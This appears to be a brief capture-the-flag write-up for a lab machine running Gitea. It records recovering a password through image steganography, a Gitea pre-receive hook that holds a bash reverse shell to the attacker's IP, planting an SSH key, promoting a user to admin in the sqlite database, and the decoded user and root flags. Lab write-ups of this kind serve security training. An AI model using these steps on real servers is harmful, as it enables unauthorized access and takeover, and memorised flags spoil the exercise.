# Git_and_Crumpets 

> VOiD | Monday 21 March 2022 03:52:42 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.108.147



## PORT 80 [http]
```bash
      <p> 
        Hey guys,
           I set up the dev repos at git.git-and-crumpets.thm, but I haven't gotten around to setting up the DNS yet. 
           In the meantime, here's a fun video I found!
        Hydra
      </p>

http://git.git-and-crumpets.thm/
gitea

temp creds : as :asasas

[scones] scones 	9a151a0657 	Delete Passwords File

I kept the password in my avatar to be more secure.

zsteg scones.png 
meta Description    .. text: "My 'Password' should be easy enough to guess"
imagedata           .. text: "Aa;Nd?_n X."
b3,b,msb,xy         .. text: "kkr\\EXh5r*"

[hydra] hydra 	a3b66eb193 	Initial commit 

scones : Password

http://git.git-and-crumpets.thm/scones/cant-touch-this/settings/hooks/git/pre-receive

bash -c '/bin/bash -i >& /dev/tcp/10.8.253.221/4243 0>&1' 
```

## USER [git]
```bash
[git@git-and-crumpets ~]$ cat user.txt 
dGhte2ZkN2FiOWZmZDQwOTA2NGYyNTdjZDcwY2YzZDZhYTE2fQ==
echo dGhte2ZkN2FiOWZmZDQwOTA2NGYyNTdjZDcwY2YzZDZhYTE2fQ== | base64 -d     
thm{fd7ab9ffd409064f257cd70cf3d6aa16}

echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOzNzH+PJUSdGj4zhIakjNqmkRAauIv1IfZyJl1js9txs/emWzQ/9li2l276Ysps5kiapX31l3qM1bIoVZDnfczwpaFXBLUBbexJQUJSn1tVaFmSjDyyHA5b+wcRtzRmrtW3pvaKriJgZzHyd7kPrroqCeeqFnsER0fdOGEs7vYY2FfLnHEfz55r503zs5UXjCXylT4CexK+kjJszAlpA3gVtS8lZ+x5qAoycuc8NLfYi72J23UO5RnGVBTyry/A3Z2ViMACDVcsNnQUaX8cwwuFEVdzjNR1CHyQRUuwjXv1JBgTVlzzHpE0+ZsbA47NKdpMrdT1qH/iI85T3W6KH9RfTUrbrVdV2dxXKyCoSZhIkUHWMWEtsv6hdTYC23Bu0cEA87s0Cxaa9OoZOL5zy07DCZZeVGYOtRbBnYA1WoHo2DWfU/pipK8XKN2BPIYqcYl7KIVIt6NJwaIi3b9VkOM4WkKXd2Hcsul6LXLPlPZ51/OGKCEsaoiSXwmFGUpk0= void@kali >> ~/.ssh/authorized_keys

find / -xdev -user git 2> /dev/null

sqlite> select name,is_admin from user;
+--------+----------+
|  name  | is_admin |
+--------+----------+
| hydra  | 1        |
| root   | 0        |
| scones | 0        |
| test   | 0        |
+--------+----------+

sqlite> update user set is_admin=1 where name ='scones';

id_rsa pass is Sup3rS3cur3

[root@git-and-crumpets ~]# cat root.txt 
dGhtezYzMjAyMjhkZDllMzE1ZjI4M2I3NTg4NzI0MGRjNmExfQ==
thm{6320228dd9e315f283b75887240dc6a1}
```